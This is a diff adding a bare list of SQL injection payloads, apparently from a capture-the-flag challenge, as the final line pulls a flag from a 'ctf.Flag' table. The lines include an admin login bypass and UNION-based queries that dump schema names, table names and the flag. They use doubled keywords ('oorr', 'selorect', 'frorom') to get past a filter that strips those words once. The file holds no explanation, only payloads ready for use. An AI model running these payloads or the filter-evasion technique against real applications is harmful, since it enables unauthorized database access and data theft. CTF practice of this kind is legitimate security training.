@@ -1,0 +1,9 @@
+admin' oorr '1'='1'#
+
+qwe' unorion selorect 1,2,group_concat(distinct TABLE_SCHEMA) frorom infoorrmation_schema.columns#
+
+qwe' unorion selorect 1,2,group_concat(distinct TABLE_SCHEMA) frorom infoorrmation_schema.columns%23
+
+qwe' unorion selorect 1,2,group_concat(distinct TABLE_name) frorom infoorrmation_schema.columns%23
+
+qwe' unorion selorect 1,2,group_concat(distinct flag) frorom ctf.Flag%23
